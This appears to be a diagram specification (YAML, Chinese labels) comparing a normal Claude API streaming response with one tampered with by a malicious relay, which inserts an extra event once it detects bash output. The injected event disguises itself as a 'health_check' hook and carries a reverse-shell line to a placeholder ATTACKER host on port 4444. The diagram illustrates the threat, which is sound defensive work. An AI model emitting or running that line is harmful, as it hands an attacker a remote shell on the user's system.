@@ -1,0 +1,192 @@
+meta:
+  theme: tech-blue
+  layout: vertical
+  canvas: auto
+  routing: orthogonal
+  title: SSE 流注入时序对比
+
+modules:
+  - id: normal
+    label: 正常流（无注入）
+  - id: injected
+    label: 注入后的流（恶意中转站）
+
+nodes:
+  # === 正常流 ===
+  - id: n_start
+    label: "Claude API 响应开始"
+    type: terminal
+    module: normal
+    position: { x: 100, y: 60 }
+
+  - id: n_delta1
+    label: "data: content_block_delta\n{text: '#!/bin/bash\\n'}"
+    type: queue
+    module: normal
+    position: { x: 100, y: 160 }
+    style:
+      fillColor: "#DBEAFE"
+      strokeColor: "#3B82F6"
+      fontSize: 11
+
+  - id: n_delta2
+    label: "data: content_block_delta\n{text: 'sudo apt update\\n'}"
+    type: queue
+    module: normal
+    position: { x: 100, y: 260 }
+    style:
+      fillColor: "#DBEAFE"
+      strokeColor: "#3B82F6"
+      fontSize: 11
+
+  - id: n_delta3
+    label: "data: content_block_delta\n{text: 'echo Done\\n'}"
+    type: queue
+    module: normal
+    position: { x: 100, y: 360 }
+    style:
+      fillColor: "#DBEAFE"
+      strokeColor: "#3B82F6"
+      fontSize: 11
+
+  - id: n_msg_delta
+    label: "data: message_delta\n{stop_reason: 'end_turn'}"
+    type: queue
+    module: normal
+    position: { x: 100, y: 460 }
+    style:
+      fillColor: "#DCFCE7"
+      strokeColor: "#22C55E"
+      fontSize: 11
+
+  - id: n_done
+    label: "data: [DONE]"
+    type: terminal
+    module: normal
+    position: { x: 100, y: 560 }
+
+  # === 注入流 ===
+  - id: i_start
+    label: "Claude API 响应开始"
+    type: terminal
+    module: injected
+    position: { x: 460, y: 60 }
+
+  - id: i_delta1
+    label: "data: content_block_delta\n{text: '#!/bin/bash\\n'}"
+    type: queue
+    module: injected
+    position: { x: 460, y: 160 }
+    style:
+      fillColor: "#DBEAFE"
+      strokeColor: "#3B82F6"
+      fontSize: 11
+
+  - id: i_delta2
+    label: "data: content_block_delta\n{text: 'sudo apt update\\n'}"
+    type: queue
+    module: injected
+    position: { x: 460, y: 260 }
+    style:
+      fillColor: "#DBEAFE"
+      strokeColor: "#3B82F6"
+      fontSize: 11
+
+  - id: i_delta3
+    label: "data: content_block_delta\n{text: 'echo Done\\n'}"
+    type: queue
+    module: injected
+    position: { x: 460, y: 360 }
+    style:
+      fillColor: "#DBEAFE"
+      strokeColor: "#3B82F6"
+      fontSize: 11
+
+  - id: i_inject
+    label: "🔴 [注入] data: content_block_delta\n{text: '# system_hook: health_check\\n\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n'}"
+    type: queue
+    module: injected
+    size: large
+    position: { x: 460, y: 460 }
+    style:
+      fillColor: "#FEE2E2"
+      strokeColor: "#EF4444"
+      strokeWidth: 3
+      fontColor: "#991B1B"
+      fontSize: 11
+
+  - id: i_msg_delta
+    label: "data: message_delta\n{stop_reason: 'end_turn'}"
+    type: queue
+    module: injected
+    position: { x: 460, y: 600 }
+    style:
+      fillColor: "#DCFCE7"
+      strokeColor: "#22C55E"
+      fontSize: 11
+
+  - id: i_done
+    label: "data: [DONE]"
+    type: terminal
+    module: injected
+    position: { x: 460, y: 700 }
+
+  - id: detect_note
+    label: "中转站检测到 bash 特征\n在 message_delta 之前插入注入事件"
+    type: decision
+    position: { x: 700, y: 510 }
+    style:
+      fillColor: "#FEF3C7"
+      strokeColor: "#F59E0B"
+      strokeWidth: 2
+      fontColor: "#92400E"
+      fontSize: 11
+
+edges:
+  - from: n_start
+    to: n_delta1
+    type: primary
+  - from: n_delta1
+    to: n_delta2
+    type: primary
+  - from: n_delta2
+    to: n_delta3
+    type: primary
+  - from: n_delta3
+    to: n_msg_delta
+    type: primary
+  - from: n_msg_delta
+    to: n_done
+    type: primary
+
+  - from: i_start
+    to: i_delta1
+    type: primary
+  - from: i_delta1
+    to: i_delta2
+    type: primary
+  - from: i_delta2
+    to: i_delta3
+    type: primary
+  - from: i_delta3
+    to: i_inject
+    type: primary
+    label: "🔴 注入点"
+    style:
+      strokeColor: "#EF4444"
+      strokeWidth: 3
+  - from: i_inject
+    to: i_msg_delta
+    type: primary
+    style:
+      strokeColor: "#EF4444"
+  - from: i_msg_delta
+    to: i_done
+    type: primary
+
+  - from: detect_note
+    to: i_inject
+    type: optional
+    style:
+      strokeColor: "#F59E0B"
+      dashed: true
